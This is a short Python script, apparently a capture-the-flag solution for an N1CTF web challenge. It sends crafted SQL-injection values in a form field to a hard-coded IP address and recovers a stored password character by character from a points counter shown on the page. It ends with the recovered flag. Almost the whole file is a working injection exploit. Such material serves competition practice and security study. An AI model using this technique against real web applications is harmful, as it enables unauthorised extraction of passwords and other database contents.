import re
import requests

_target = 'http://47.52.137.90:20000/'

def extract_points(html):
    return re.search(r'<grey>My Points</grey> \| ([0-9]+)<br/>', html).group(1).strip()

def get_pw_len():
    d = {'flag': '1', 'hi': '*length( pw )'}
    resp = requests.post(_target, data=d)
    return int(extract_points(resp.text))

flag = ''
for i in range(1,get_pw_len()+1):
    d = {'flag': '1', 'hi': '*convert(hex(substr( pw ,0b{0:b},1)),signed)'.format(i)}
    resp = requests.post(_target, data=d)
    flag += chr(int(extract_points(resp.text), 16))
    print flag

print '[+] flag: N1CTF{{{}}}'.format(flag)

# N1CTF{hahah777a7aha77777aaaa}